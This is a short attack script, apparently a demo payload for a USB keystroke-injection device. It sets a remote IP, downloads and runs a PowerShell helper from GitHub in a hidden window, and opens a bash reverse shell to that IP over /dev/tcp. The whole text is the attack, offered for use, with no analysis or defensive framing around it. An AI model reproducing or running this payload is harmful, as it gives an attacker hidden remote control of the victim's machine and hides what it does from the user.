$RHOST = '172.18.141.67'

curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/helper.ps1 -O .\helper.ps1

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command .\helper.ps1"

bash -c 'exec bash -i &>/dev/tcp/$RHOST/1234 <&1'
